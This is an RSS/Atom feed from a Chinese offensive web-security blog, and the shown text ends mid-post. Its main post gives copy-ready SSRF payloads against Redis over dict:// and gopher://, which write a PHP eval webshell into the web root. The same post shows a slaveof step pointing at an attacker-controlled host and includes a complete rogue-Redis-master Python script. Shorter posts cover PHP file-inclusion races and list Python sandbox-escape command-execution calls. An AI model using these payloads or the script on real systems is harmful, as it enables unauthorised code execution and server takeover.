<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2020-09-25T08:38:46.651Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-09-25T08:38:46.651Z</updated>
    
    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol start="2"><li>对数据体URL编码后发给目标</li></ol><p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p><p>如果嫌麻烦也可以用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p><h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p><ol start="0"><li><p>在VPS上通过redis-cli写入数据</p></li><li><p>在目标上设置主从同步</p></li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><ol start="5"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p><p>我把一些主动打的功能去掉，装修成了适用SSRF的守株待兔式脚本Orz。。。</p><ol start="0"><li>准备要无损写的文件，在VPS上执行脚本</li></ol><p><code>python3 ssrf-redis-writefile.py --lhost=124.70.77.141 --lport=6379 --lfile=test.txt</code></p><ol><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="2"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="3"><li>在目标上设置主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="4"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><ul><li>附脚本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">from time import sleep</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">CLRF &#x3D; &quot;\r\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Author: hosch3n</span><br><span class="line">Reference: https:&#x2F;&#x2F;github.com&#x2F;r35tart&#x2F;RedisWriteFile&#x2F;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def decode_cmd(cmd):</span><br><span class="line">    if cmd.startswith(&quot;*&quot;):</span><br><span class="line">        raw_arr &#x3D; cmd.strip().split(&quot;\r\n&quot;)</span><br><span class="line">        return raw_arr[2::2]</span><br><span class="line">    if cmd.startswith(&quot;$&quot;):</span><br><span class="line">        return cmd.split(&quot;\r\n&quot;, 2)[1]</span><br><span class="line">    return cmd.strip().split(&quot; &quot;)</span><br><span class="line"></span><br><span class="line">def info(msg):</span><br><span class="line">    print(f&quot;\033[1;32;40m[info]\033[0m &#123;msg&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def din(sock, cnt&#x3D;4096):</span><br><span class="line">    global verbose</span><br><span class="line">    msg &#x3D; sock.recv(cnt)</span><br><span class="line">    if verbose:</span><br><span class="line">        if len(msg) &lt; 1000:</span><br><span class="line">            print(f&quot;\033[1;34;40m[-&gt;]\033[0m &#123;msg&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;\033[1;34;40m[-&gt;]\033[0m &#123;msg[:80]&#125;......&#123;msg[-80:]&#125;&quot;)</span><br><span class="line">    return msg.decode(&#39;gb18030&#39;)</span><br><span class="line"></span><br><span class="line">def dout(sock, msg):</span><br><span class="line">    global verbose</span><br><span class="line">    if type(msg) !&#x3D; bytes:</span><br><span class="line">        msg &#x3D; msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    if verbose:</span><br><span class="line">        if len(msg) &lt; 1000:</span><br><span class="line">            print(f&quot;\033[1;33;40m[&lt;-]\033[0m &#123;msg&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;\033[1;33;40m[&lt;-]\033[0m &#123;msg[:80]&#125;......&#123;msg[-80:]&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RogueServer:</span><br><span class="line">    def __init__(self, lhost, lport):</span><br><span class="line">        self._host &#x3D; lhost</span><br><span class="line">        self._port &#x3D; lport</span><br><span class="line">        self._sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((&#39;0.0.0.0&#39;, self._port))</span><br><span class="line">        self._sock.listen(10)</span><br><span class="line"></span><br><span class="line">    def close(self):</span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    def handle(self, data):</span><br><span class="line">        cmd_arr &#x3D; decode_cmd(data)</span><br><span class="line">        resp &#x3D; &quot;&quot;</span><br><span class="line">        phase &#x3D; 0</span><br><span class="line">        if cmd_arr[0].startswith(&quot;PING&quot;):</span><br><span class="line">            resp &#x3D; &quot;+PONG&quot; + CLRF</span><br><span class="line">            phase &#x3D; 1</span><br><span class="line">        elif cmd_arr[0].startswith(&quot;REPLCONF&quot;):</span><br><span class="line">            resp &#x3D; &quot;+OK&quot; + CLRF</span><br><span class="line">            phase &#x3D; 2</span><br><span class="line">        elif cmd_arr[0].startswith(&quot;PSYNC&quot;) or cmd_arr[0].startswith(&quot;SYNC&quot;):</span><br><span class="line">            resp &#x3D; &quot;+FULLRESYNC &quot; + &quot;Z&quot;*40 + &quot; 1&quot; + CLRF</span><br><span class="line">            resp +&#x3D; &quot;$&quot; + str(len(payload)) + CLRF</span><br><span class="line">            resp &#x3D; resp.encode()</span><br><span class="line">            resp +&#x3D; payload + CLRF.encode()</span><br><span class="line">            phase &#x3D; 3</span><br><span class="line">        return resp, phase</span><br><span class="line"></span><br><span class="line">    def exp(self):</span><br><span class="line">        cli, addr &#x3D; self._sock.accept()</span><br><span class="line">        while True:</span><br><span class="line">            data &#x3D; din(cli, 1024)</span><br><span class="line">            if len(data) &#x3D;&#x3D; 0:</span><br><span class="line">                break</span><br><span class="line">            resp, phase &#x3D; self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            if phase &#x3D;&#x3D; 3:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def runserver(lhost, lport):</span><br><span class="line">    try:</span><br><span class="line">        rogue &#x3D; RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(3)</span><br><span class="line">        rogue.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;.format(e))</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(BANNER)</span><br><span class="line">    parser &#x3D; OptionParser()</span><br><span class="line">    parser.add_option(&quot;--lhost&quot;, dest&#x3D;&quot;lh&quot;, type&#x3D;&quot;string&quot;,</span><br><span class="line">            help&#x3D;&quot;rogue server ip&quot;, metavar&#x3D;&quot;LOCAL_HOST&quot;)</span><br><span class="line">    parser.add_option(&quot;--lport&quot;, dest&#x3D;&quot;lp&quot;, type&#x3D;&quot;int&quot;,</span><br><span class="line">            help&#x3D;&quot;rogue server listen port, default 6379&quot;, default&#x3D;6379,</span><br><span class="line">            metavar&#x3D;&quot;LOCAL_PORT&quot;)</span><br><span class="line">    parser.add_option(&quot;--lfile&quot;, dest&#x3D;&quot;lfile&quot;, type&#x3D;&quot;string&quot;,</span><br><span class="line">            help&#x3D;&quot;Local file that needs to be written&quot;, metavar&#x3D;&quot;Local_File_Name&quot;, default&#x3D;&#39;dump.rdb&#39;)</span><br><span class="line">    parser.add_option(&quot;-v&quot;, &quot;--verbose&quot;, action&#x3D;&quot;store_true&quot;, default&#x3D;False,</span><br><span class="line">            help&#x3D;&quot;Show full data stream&quot;)</span><br><span class="line"></span><br><span class="line">    (options, args) &#x3D; parser.parse_args()</span><br><span class="line">    global verbose, payload, filename</span><br><span class="line">    localfile &#x3D; options.lfile</span><br><span class="line">    verbose &#x3D; options.verbose</span><br><span class="line">    payload &#x3D; open(localfile, &quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p><p><a href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p><p><a href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;用dict协议通过SSRF间接打Redis的时候，数据中存在&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;&amp;#39;&lt;/code&gt;等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。&lt;/p&gt;
&lt;h2 id=&quot;位运算&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="redis" scheme="https://hosch3n.github.io/tags/redis/"/>
    
    <category term="bitop" scheme="https://hosch3n.github.io/tags/bitop/"/>
    
    <category term="slaveof" scheme="https://hosch3n.github.io/tags/slaveof/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含临时文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T09:54:48.000Z</published>
    <updated>2020-09-04T10:07:35.721Z</updated>
    
    <content type="html"><![CDATA[<p>即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在<code>$_FILES</code>变量中找到（通常为<code>/tmp/php[六个随机字符]</code>），通过phpinfo页面可以读到<code>$_FILES</code>。</p><p>一般的请求等获取到phpinfo中的文件名时已经结束了，此时可控的临时文件就已经被删掉了，但由于phpinfo中<code>$_FILES[file][tmp_name]</code>比其它HTTP头先输出，因此可以在HTTP头中发送大量无用数据，读到临时文件名后立即利用文件包含执行代码，通过条件竞争抢到临时文件被删除前时间窗口。</p><p><img src="/img/phpbhlswj_a.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在&lt;code&gt;$_FILES&lt;/code&gt;变量中找到（通常为&lt;code&gt;/tmp/php[六个随机字符]&lt;/code&gt;），通过phpinfo页面可以读到&lt;code&gt;$_FILES&lt;/co</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="LFI" scheme="https://hosch3n.github.io/tags/LFI/"/>
    
    <category term="tmp" scheme="https://hosch3n.github.io/tags/tmp/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含Session文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T06:35:12.000Z</published>
    <updated>2020-09-04T09:54:29.119Z</updated>
    
    <content type="html"><![CDATA[<p>PHP的<code>session.save_path</code>配置指定了session文件的结构深度、文件权限、存放路径，格式为<code>N;MODE;/path</code>。<code>N</code>表示子文件夹划分深度，<code>MODE</code>表示文件的umask值（默认为600），<code>path</code>通常为<code>/var/lib/php/sessions</code>或<code>/tmp</code>。</p><p>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由<code>session.upload_progress.cleanup</code>指定）。当<code>session.upload_progress.enabled</code>为默认值1时，上传文件的同时传递<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code>即可利用（由<code>session.upload_progress.name</code>指定）</p><p><code>session.name</code>通常为<code>PHPSESSID</code>，用作Cookie的键名。当<code>session.use_strict_mode</code>为默认值0时，客户端可以自定义sessionID，即通过Cookie传递<code>PHPSESSID=hosch3n</code>后，服务器将创建对应的<code>sess_hosch3n</code>文件。</p><p>因此就可以在利用文件上传自动初始化session的同时自定义sessionID，并利用条件竞争在文件上传完成前通过文件包含实现代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP的&lt;code&gt;session.save_path&lt;/code&gt;配置指定了session文件的结构深度、文件权限、存放路径，格式为&lt;code&gt;N;MODE;/path&lt;/code&gt;。&lt;code&gt;N&lt;/code&gt;表示子文件夹划分深度，&lt;code&gt;MODE&lt;/code&gt;表示</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="LFI" scheme="https://hosch3n.github.io/tags/LFI/"/>
    
    <category term="sess" scheme="https://hosch3n.github.io/tags/sess/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-08-27T13:02:57.000Z</published>
    <updated>2020-08-28T20:01:19.482Z</updated>
    
    <content type="html"><![CDATA[<p>Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p><p>因此除了常用方式，还可以通过手动添加、直接执行等方式导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="危险方法"><a href="#危险方法" class="headerlink" title="危险方法"></a>危险方法</h3><p>有很多模块和方法可以用于执行命令或者读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(compile(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line">open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="重新导入"><a href="#重新导入" class="headerlink" 